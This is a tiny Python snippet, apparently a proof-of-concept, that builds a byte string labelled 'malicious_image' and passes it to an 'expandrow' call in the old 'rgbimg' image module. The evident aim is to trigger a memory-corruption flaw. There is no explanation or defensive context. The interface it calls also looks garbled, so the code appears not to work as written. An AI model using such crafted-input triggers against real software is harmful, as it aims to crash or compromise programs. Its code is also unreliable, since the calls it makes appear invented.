import rgbimg

malicious_image = b'\x01\x02\x03\x04' * 1024

img = rgbimg.rgbimg()

img.expandrow(malicious_image, 1024)